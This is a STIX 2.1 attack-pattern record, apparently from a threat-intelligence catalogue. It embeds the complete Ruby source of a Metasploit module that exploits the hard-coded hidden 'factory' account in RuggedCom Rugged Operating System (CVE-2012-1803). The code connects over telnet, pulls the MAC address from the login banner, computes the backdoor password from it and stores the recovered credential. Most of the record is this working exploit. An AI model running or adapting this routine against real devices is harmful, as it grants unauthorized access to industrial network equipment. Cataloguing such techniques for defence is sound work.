{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--58524650-2445-4388-a750-471eead33b8b",
    "created": "2024-08-14T16:26:46.625158Z",
    "modified": "2024-08-14T16:26:46.625165Z",
    "name": "RuggedCom Telnet Password Generator",
    "description": " This module will calculate the password for the hard-coded hidden username \"factory\" in the RuggedCom Rugged Operating System (ROS). The password is dynamically generated based on the devices MAC address.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/telnet/telnet_ruggedcom.rb",
            "external_id": "telnet_ruggedcom.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Telnet\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'RuggedCom Telnet Password Generator',\n      'Description' => %q{\n        This module will calculate the password for the hard-coded hidden username\n        \"factory\" in the RuggedCom Rugged Operating System (ROS). The password is\n        dynamically generated based on the devices MAC address.\n      },\n      'References'     =>\n        [\n          [ 'CVE', '2012-1803' ],\n          [ 'EDB', '18779' ],\n          [ 'US-CERT-VU', '889195' ]\n        ],\n      'Author'      => [\n        'Borja Merino <bmerinofe[at]gmail.com>',\n        'jc' # ExploitDB PoC\n        ],\n      'License'     => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(23),\n        OptString.new('USERNAME', [ true, 'The username to authenticate as', 'factory']),\n        OptInt.new('TIMEOUT', [true, 'Timeout for the Telnet probe', 30])\n      ])\n  end\n\n\n  def mac_to_password(mac)\n    print_status(\"MAC Address: #{mac}\")\n    mac_clean = mac.gsub(\"-\",\"\")\n    mac_reverse = mac_clean.each_char.each_slice(2).to_a.reverse.join\n    mac_reverse << \"0000\"\n    pass = mac_reverse.hex % 999999929\n    print_status(\"Password: #{pass}\")\n    return pass.to_s\n  end\n\n\n  def get_info(banner)\n    product = banner.match(/Product:\\s*\\S*/)[0]\n    so_version = banner.match(/Rugged Operating System\\s\\S*/)[0]\n    return so_version << \"  \" << product\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: 'telnet',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: DateTime.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def run_host(ip)\n    to = (datastore['TIMEOUT'].zero?) ? 30 : datastore['TIMEOUT']\n    begin\n      ::Timeout.timeout(to) do\n        res = connect\n        banner_santized = Rex::Text.to_hex_ascii(banner.to_s)\n        if banner_santized =~ /Rugged Operating System/\n          print_status(\"#{ip}:#{rport} Calculating Telnet password ...\")\n          mac  = banner_santized.match(/((?:[0-9a-f]{2}[-]){5}[0-9a-f]{2})/i)[0]\n          password = mac_to_password(mac)\n          info = get_info(banner_santized)\n          report_cred(ip: rhost, port: rport, user:'factory', password: password, proof: banner_santized)\n          break\n        else\n          print_status(\"It doesn't seem to be a RuggedCom service.\")\n          break\n        end\n      end\n\n    rescue ::Rex::ConnectionError\n    rescue Timeout::Error\n      print_error(\"#{target_host}:#{rport}, Server timed out after #{to} seconds. Skipping.\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}